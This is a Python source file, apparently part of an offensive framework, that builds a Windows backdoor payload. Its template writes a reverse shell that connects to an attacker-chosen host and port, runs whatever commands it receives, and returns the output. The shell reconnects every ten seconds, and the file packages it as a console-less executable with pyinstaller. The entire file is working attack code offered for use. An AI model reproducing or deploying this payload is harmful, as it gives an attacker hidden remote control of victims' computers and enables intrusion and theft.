# kush-framework/kush/payloads/windows.py
"""
Windows payload generator
"""

import os
import subprocess
from pathlib import Path
from kush.payloads.templates import PayloadTemplate

class WindowsPayload(PayloadTemplate):
    def generate(self, lhost: str, lport: str, output_name: str,
                 output_dir: Path, **kwargs) -> str:
        if not output_name:
            output_name = f"kush_windows_{lhost}_{lport}"
        
        # Create Python script
        script_content = self._create_backdoor_script(lhost, lport)
        script_path = output_dir / f"{output_name}.py"
        
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        # Try to compile to exe
        try:
            exe_path = output_dir / f"{output_name}.exe"
            result = subprocess.run([
                "pyinstaller", "--onefile", "--noconsole",
                f"--name={output_name}",
                f"--distpath={output_dir}",
                str(script_path)
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                os.remove(script_path)
                return str(exe_path)
            else:
                return str(script_path)
                
        except:
            return str(script_path)
    
    def _create_backdoor_script(self, lhost: str, lport: str) -> str:
        return f'''import socket
import subprocess
import os
import time

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{lhost}', {lport}))
        
        while True:
            command = s.recv(1024).decode()
            if command == "exit":
                s.close()
                break
            
            output = subprocess.getoutput(command)
            s.send(output.encode())
            
    except Exception:
        time.sleep(10)
'''